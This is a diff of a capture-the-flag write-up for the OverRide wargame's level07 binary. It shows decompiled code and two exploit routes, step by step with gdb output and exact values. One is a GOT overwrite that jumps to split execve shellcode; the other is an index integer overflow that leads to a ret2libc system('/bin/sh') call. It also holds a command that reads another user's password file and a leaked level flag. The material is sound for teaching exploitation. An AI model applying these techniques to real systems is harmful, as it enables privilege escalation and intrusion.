@@ -1,275 +1,350 @@
 
-/**********************************************/
-    P R O G R A M    E X P L A N A T I O N S
-/**********************************************/
 
-=> We can run 3 commands in this program
+# level07
 
-=> "store" allow us to write a number (uint) at buffer[index*4], where index is also a uint
-We have the possiblity to write in our stack than the condition are met (index is not multiple of 3 AND the 8 most significants bytes of number begin by B7000000 - 3070230528
+## General Informations 
 
-=> "read" can read an unsigned int from the index buffer[index*4]
+**Path** : `/home/users/level07/level07` </br>
+**File** : 
+```
+level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf5b46cdb878d5a3929cc27efbda825294de5661e, not stripped
+```
+**Permissions**: `-rwsr-s---+ 1 level08 users 11744 Sep 10  2016 level07`  </br>
+**Protections**:
+```
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   level07
+```
 
-=> "quit" quit the program
+## Static Analysis
 
-/********************************************/
-		S T R A T E G Y
-/********************************************/
+After decompiling the binary in ghidra, we get the pseudo code below: 
 
-=====> F A I L =====>
-- cannot overwrite ret addr of main (index 114)
-can overwrite ebp 113 but not ret addr 114
-- cannot overwrite ret addr of store_number (-11)
-same like probleme like index ret addr main
-=> mainly because of % 3
+```
+undefined4 get_unum(void)
+{
+  undefined4 local_10 [3];
+  
+  local_10[0] = 0;
+  fflush(stdout);
+  __isoc99_scanf("%u",local_10);
+  clear_stdin();
+  return local_10[0];
+}
 
-
-=====> New Strategy  =====>
-=> Let's try to overwrite an address in the got.plt entry
-=> It seems possible because it has more than 3 addr functions so we can access one of them (counter % 3)
-
-/*****************************/
-	G O T . P L T
-/*****************************/
-
-=> Firstly we need to find the index of the buffer
-Input command: store
- Number: 55 (0x37)
- Index: 1
-0xffffd570:	0x00000000 0x00000000 <- buffer[0]  0x00000037 (55) <- buffer[1] 0x00000000
-buffer[0]:	0xffffd574
-
-=> Now we need to have the offset to acces the got.plt table from the buffer address
+undefined4 read_number(int param_1)
+{
+  int index;
+  
+  printf(" Index: ");
+  index = get_unum();
+  printf(" Number at data[%u] is %u\n",index,*(undefined4 *)(index * 4 + param_1));
+  return 0;
+}
 
 
-0xffffffff - 0xffffd574 =>
-End stack  - buffer[0]  =>
-4294967295 - 4294956404 = 10891
+undefined4 store_number(int param_1)
+{
+  uint number;
+  uint index;
+  undefined4 ret_val;
+  
+  printf(" Number: ");
+  number = get_unum();
+  printf(" Index: ");
+  index = get_unum();
+  if ((index % 3 == 0) || (number >> 0x18 == 0xb7)) {
+    puts(" *** ERROR! ***");
+    puts("   This index is reserved for wil!");
+    puts(" *** ERROR! ***");
+    ret_val = 1;
+  }
+  else {
+    *(uint *)(index * 4 + param_1) = number;
+    ret_val = 0;
+  }
+  return ret_val;
+}
 
-=> We will focus the fflush@got.plt address
-804a004 (134520836) <fflush@got.plt>:     0xf7e90880
-804a004 + (0xff... - buffer[0]) = 134520836 + 10891 = 134531727
+undefined4 main(undefined4 param_1,int *param_2,int *param_3)
+{
+  char cVar1;
+  byte bVar2;
+  int iVar3;
+  uint uVar4;
+  byte *pbVar5;
+  char *pcVar7;
+  byte *pbVar8;
+  int in_GS_OFFSET;
+  bool bVar9;
+  bool bVar10;
+  bool bVar11;
+  byte bVar12;
+  int *local_1c8;
+  int *local_1c4;
+  undefined4 buffer [100];
+  undefined4 ret_value;
+  byte command [20];
+  int local_14;
+  
+  bVar12 = 0;
+  local_1c4 = param_2;
+  local_1c8 = param_3;
+  local_14 = *(int *)(in_GS_OFFSET + 0x14);
+  ret_value = 0;
+  memset(&command, 0, 20);
+  memset(&buffer, 0, 100);
+  for (; *local_1c4 != 0; local_1c4 = local_1c4 + 1) {
+    uVar4 = 0xffffffff;
+    pcVar7 = (char *)*local_1c4;
+    do {
+      if (uVar4 == 0) break;
+      uVar4 = uVar4 - 1;
+      cVar1 = *pcVar7;
+      pcVar7 = pcVar7 + (uint)bVar12 * -2 + 1;
+    } while (cVar1 != '\0');
+    memset((void *)*local_1c4,0,~uVar4 - 1);
+  }
+  for (; *local_1c8 != 0; local_1c8 = local_1c8 + 1) {
+    uVar4 = 0xffffffff;
+    pcVar7 = (char *)*local_1c8;
+    do {
+      if (uVar4 == 0) break;
+      uVar4 = uVar4 - 1;
+      cVar1 = *pcVar7;
+      pcVar7 = pcVar7 + (uint)bVar12 * -2 + 1;
+    } while (cVar1 != '\0');
+    memset((void *)*local_1c8,0,~uVar4 - 1);
+  }
+  puts(
+      "----------------------------------------------------\n  Welcome to wil\'s crappy number stora ge service!   \n----------------------------------------------------\n Commands:                                          \n    store - store a number into the data storage    \n    read  - read a number from the data storage     \n    quit  - exit the program                        \n----------------------------------------------------\n   wil has reserved some storage :>                 \n----------------------------------------------------\n"
+      );
+  do {
+    printf("Input command: ");
+    ret_value = 1;
+    fgets((char *)command,0x14,stdin);
+    uVar4 = strlen(command) 
+    bVar9 = uVar4 == 1;
+    bVar11 = uVar4 == 2;
+    *(undefined1 *)((int)&ret_value + uVar4 + 2) = 0;
+    iVar3 = 5;
+    pbVar5 = command;
+    pbVar8 = (byte *)"store";
+    do {
+      if (iVar3 == 0) break;
+      iVar3 = iVar3 + -1;
+      bVar9 = *pbVar5 < *pbVar8;
+      bVar11 = *pbVar5 == *pbVar8;
+      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
+      pbVar8 = pbVar8 + (uint)bVar12 * -2 + 1;
+    } while (bVar11);
+    bVar10 = false;
+    bVar9 = (!bVar9 && !bVar11) == bVar9;
+    if (bVar9) {
+      ret_value = store_number(buffer);
+    }
+    else {
+      iVar3 = 4;
+      pbVar5 = command;
+      pbVar8 = &DAT_08048d61; # 'read' command
+      do {
+        if (iVar3 == 0) break;
+        iVar3 = iVar3 + -1;
+        bVar10 = *pbVar5 < *pbVar8;
+        bVar9 = *pbVar5 == *pbVar8;
+        pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
+        pbVar8 = pbVar8 + (uint)bVar12 * -2 + 1;
+      } while (bVar9);
+      bVar11 = false;
+      bVar9 = (!bVar10 && !bVar9) == bVar10;
+      if (bVar9) {
+        ret_value = read_number(buffer);
+      }
+      else {
+        iVar3 = 4;
+        pbVar5 = command;
+        pbVar8 = &DAT_08048d66; # 'quit' command
+        do {
+          if (iVar3 == 0) break;
+          iVar3 = iVar3 + -1;
+          bVar11 = *pbVar5 < *pbVar8;
+          bVar9 = *pbVar5 == *pbVar8;
+          pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
+          pbVar8 = pbVar8 + (uint)bVar12 * -2 + 1;
+        } while (bVar9);
+        if ((!bVar11 && !bVar9) == bVar11) {
+          if (local_14 == *(int *)(in_GS_OFFSET + 0x14)) {
+            return 0;
+          }
+          __stack_chk_fail();
+        }
+      }
+    }
+    if (ret_value == 0) {
+      printf(" Completed %s command successfully\n",command);
+    }
+    else {
+      printf(" Failed to do %s command\n",command);
+    }
+    memset(&command, 0, 20);
+  } while( true );
+}
+```
 
-(gdb) x 0xffffd574 + 134531727 (buffer[0] + index)
-0x804a003 <printf@got.plt+3>:	0x048486f7
+- `get_unum`, asks for a usingend number and return it
+- `read_number`, asks for an `index` and read the value stored at `buffer + (index * 4)`
+- `store_number`:
+    - Asks for an `index` and a `number` 
+    - If the `index` is not a multiple of 3 and the first byte isn't equals to 183 (`number >> 0x18 == 0xb7`), then the `number` is written at the location `index * 4 + param_1`
+- `main`:
+    - Infinite loop 
+    - Asking to execute 3 commands: `read`, `store` and `quit`
 
-=> We have the address 0x804a003 we need to add 1 to have 804a004 (printf@got.plt)
 
-(gdb) x 0xffffd574 + 134531728
-0x804a004 <fflush@got.plt>:	0x08048486
+## Vulnerability found  
 
-=> We then divide it by 4 and check if it pass the modulo condition (% 3)
-134531728 ÷ 4 = 33632932
-33632932 % 3 = 1
-=> The index is not a multiple of 3
+The vulnerability lies in the code. We can overflow the unsigned int `index` and overwrite the return address of main.   
 
-Input command: store
- Number: 55
- Index: 33632932
-...
+## Dynamic Analysis
+
+First we put a breakpoint at the `fgets` call: 
+```
+(gdb) b *0x08048882
+Breakpoint 1 at 0x8048882
 (gdb) c
-Input command: store
-Program received signal SIGSEGV, Segmentation fault.
-0x00000037 in ?? ()
-
-=> The redirection of fflush is redirect to an arbitrary address (number)
-=> We can redirect the execution of printf to the stack
-buffer[1] = 0xffffd578 = 4294956408
-
-=> We try it with a sigtrap
-store:
-        number: 3435973836 (\xcc\xcc\xcc\xcc)
-        index:  1
 ...
-store:
- 	number: 4294956408 (buffer[1])
- 	index: 33632932 (index * 4 to write to fflush@got.plt)
-...
-Program received signal SIGTRAP, Trace/breakpoint trap.
-0xffffd579 in ?? ()
-
-
-=> But in the real environment addresses mismatch (the hell begin)
-
-/***********************************/
-	O U T S I D E    G D B
-/***********************************/
-
-=> To found the good index we need to use the read command and play with it
-
-(gdb) x 0x804a000
-0x804a000 <printf@got.plt>:	0xf7e78480
-(gdb) x 0x804a004
-0x804a004 <fflush@got.plt>:	0xf7e90880
-(gdb) x 0x804a008
-0x804a008 <getchar@got.plt>:	0xf7e94840
-(gdb) x 0x804a00c
-0x804a00c <fgets@got.plt>:	0xf7e90ba0
-
-index: 33632932 -> 134520616 -> 8049F28
-...
-index: 33632936 -> 4159244416 -> 0xf7e90880
-https://www.rapidtables.com/convert/number/decimal-to-hex.html?x=4159244416
-
-INDEX: 33632936
-=> We have a difference of 4 bytes
-
-=> We need to calcul the begin of the buffer too
-=> To do that we put a sigtrap at buffer[1] and play with the inital address found in gdb 4294956408
-...
-number: 4294956408
-...
-number: 4294956392 -> triggers the sigtrap
-
-NUMBER buffer[1] = 4294956392
-
-
-
-/******************************************/
-	 S H E L L    C O D E
-/******************************************/
-
-=> Now that we can redirect the execution to buffer[1] we will write a shell code in that buffer
-=> We have a problem that we can't write more that 2 consecutive addresses because of the modulo 3
-=> So to resolve this problem we will slice our buffer with a jump every two adresses by adding a relative jump
-\xEB\x04 jmp 4 bytes
-
-Example
-0xffffd7d8	0x00000000	0x00000000	0x90909090
-0x04eb9090	0x00000000	0xcccccccc	0x00000000
-
-
-0:  31 c0                   xor    eax,eax
-2:  50                      push   eax
-3:  68 2f 2f 73 68          push   0x68732f2f
-8:  68 2f 62 69 6e          push   0x6e69622f
-d:  89 e3                   mov    ebx,esp
-f:  89 c1                   mov    ecx,eax
-11: 89 c2                   mov    edx,eax
-13: b0 0b                   mov    al,0xb
-15: cd 80                   int    0x80
-17: 31 c0                   xor    eax,eax
-19: 40                      inc    eax
-1a: cd 80                   int    0x80
-
-Little endian shell code + jumps
-
-\x90\x90\x90\x90  \x04\xeb\x90\x90
-2425393296	  82546832
-
---------------------------------------
-
-\x31\xc0\x50\x90 \x90\x90\xEB\x04
-9050c031	 04eb9090
-2421211185	 82546832
-    1		     2
-
-\x68\x2f\x2f\x73 \x68\x90\xEB\x04
-732f2f68	 04eb9068
-1932472168	 82546792
-    4		     5
-
-\x68\x2f\x62\x69 \x6e\x90\xEB\x04
-69622f68	 04eb906e
-1768042344	 82546798
-    7		     8
-
-\x89\xe3\x89\xc1 \x89\xc2\xEB\x04
-c189e389	 04ebc289
-3247039369	 82559625
-    10		    11
-
-\xb0\x0b\xcd\x80 \x31\xc0\xEB\x04
-80cd0bb0	 04ebc031
-2160921520	 82559025
-    13		    14
-
-\x40\xcd\x80
-80cd40
-8441152
-   16
-
-
-***********************************************************************
-		F I N A L
-
-Input command: store
- Number: 2421211185
+ Number: 1
  Index: 1
+...
+(gdb) x/50x $esp 
+0xffffd430:	0xffffd5e8	0x00000014	0xf7fcfac0	0xf7fdc714
+0xffffd440:	0x00000098	0xffffffff	0xffffd730	0xffffd6b8
+0xffffd450:	0x00000000	0x00000000	0x00000001	0x00000000
+```
+The buffer starts at `0xffffd454`.
+
+The return address of main is located at `0xffffd61c`:
+```
+(gdb) x $ebp + 4
+0xffffd61c:	0xf7e45513
+```
+
+We have a difference of 456 bytes from the start of the buffer and the return address of main:
+```
+(gdb) p/u 0xffffd61c - 0xffffd454
+$12 = 456
+```
+
+Let's divide 456 by 4 to know the index to write in the return address of main `456 / 4 = 114`, the index is 114: 
+```
+(gdb) c
+Continuing.
+Input command: store
+ Number: 65
+ Index: 114
+ *** ERROR! ***
+   This index is reserved for wil!
+ *** ERROR! ***
+ Failed to do store command
+```
+
+Ok. We can't write on this address with this index. </br>
+The `index` is actually an usigned int multiplied by 4, wich is vulnerable to overflow. We want to have `buffer + 456`, `(4294967296 + 456) / 4 = 4294967752 / 4 = 1073741938`.
+
+Let's try it:
+```
+(gdb) c
+...
+ Number: 5
+ Index: 1073741938
+(gdb) c
+...
+Program received signal SIGSEGV, Segmentation fault.
+0x00000005 in ?? ()
+```
+
+It works, we finally overwritted it ! Now we will use the **ret2libc** technique to execute our shell:
+```
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) p/d 0xf7e6aed0
+$3 = 4159090384
+(gdb) find &system,+99999999,"/bin/sh"
+0xf7f897ec
+(gdb) p/d 0xf7f897ec
+$4 = 4160264172
+```
+
+We write the address of `system` at the index `1073741938` and then `/bin/sh` at the index 116: (the address at index 115 is considered as the return address for `system`)
+```
+(gdb) c
+Continuing.
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
  Completed store command successfully
 
+Breakpoint 1, 0x08048882 in main ()
+(gdb) c
+Continuing.
 Input command: store
- Number: 82546832
- Index: 2
+ Number: 4160264172
+ Index: 116
  Completed store command successfully
 
-Input command: store
- Number: 1932472168
- Index: 4
- Completed store command successfully
+Breakpoint 1, 0x08048882 in main ()
+(gdb) c
+Continuing.
+Input command: quit
+$ whoami
+level07
+```
 
-Input command: store
- Number: 82546792
- Index: 5
- Completed store command successfully
+The shell is correctly executed !
 
-Input command: store
- Number: 1768042344
- Index: 7
- Completed store command successfully
+## Payload construction 
 
-Input command: store
- Number: 82546798
- Index: 8
- Completed store command successfully
+We convert the address of `system` in an unsigned int, and overflow the index to write at `buffer + 456`:
+```
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) p/d 0xf7e6aed0
+$3 = 4159090384
+...
+ Number: 4159090384
+ Index: 1073741938
+```
 
-Input command: store
- Number: 3247039369
- Index: 10
- Completed store command successfully
+We convert the address of `/bin/sh` in an usigned int too and write on the index 116 (the address at 115 is considered as the return address for `system`):
+```
+(gdb) find &system,+99999999,"/bin/sh"
+0xf7f897ec
+(gdb) p/d 0xf7f897ec
+$4 = 4160264172
+...
+ Number: 4160264172
+ Index: 116
+```
 
-Input command: store
- Number: 82559625
- Index: 11
- Completed store command successfully
+## Demonstration 
 
+```
+level07@OverRide:~$ ./level07 
+...
 Input command: store
- Number: 2160921520
- Index: 13
+ Number: 4159090384
+ Index: 1073741938
  Completed store command successfully
-
 Input command: store
- Number: 82559025
- Index: 14
+ Number: 4160264172
+ Index: 116
  Completed store command successfully
-
-Input command: store
- Number: 8441152
- Index: 16
- Completed store command successfully
-
-Input command: store
- Number: 4294956392
- Index: 33632936
- Completed store command successfully
-
-Input command: store
+Input command: quit
 $ whoami
 level08
-$ cat /home/users/level08/.pass
+```
 
-/*******************************************************************/
-
-
-
-----------------------------------------------------------------------------------
-
-0xf7e6aed0 address of system => 4159090384
-0xf7f897ec address of "/bin/sh" => 4160264172
-
-ret address at 114 index
-
-( 4294967296 / 4 ) + 114 = 1073741938
-
-on store 4159090384 avec l index 1073741938
-on store 4160264172 avec l index 116 ($eip + 2)
+## Flag 
+```
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
